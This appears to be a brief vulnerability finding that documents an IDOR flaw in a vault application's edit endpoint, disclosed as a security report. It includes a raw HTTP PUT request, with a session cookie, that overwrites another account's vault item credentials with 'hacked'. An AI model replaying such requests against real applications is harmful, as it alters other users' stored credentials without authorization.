```

/vault/edit/ 16

/vault/edit/ 12,19,20,21

```

```

PUT /vault/edit/16 HTTP/1.1
Host: 10.0.0.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.0.0.10/vault
Content-Type: application/json
Content-Length: 108
Origin: http://10.0.0.10
Connection: keep-alive
Cookie: connect.sid=s%3AeLWuBtSZOYXn-s04qW4KFVe3APiAnx-o.J%2BFeD7GBpjRXTQC3tQxNrWxWgBu9c2TY%2Bv0LUDmBIH4
Priority: u=0

{"itemId":"12","vaulttitle":"updated title from other acc vault","vaultusername":"hacked","vaultpassword":"hacked"}

```

### IDOR in `vault/edit` path [http://localhost/vault/edit/item_id].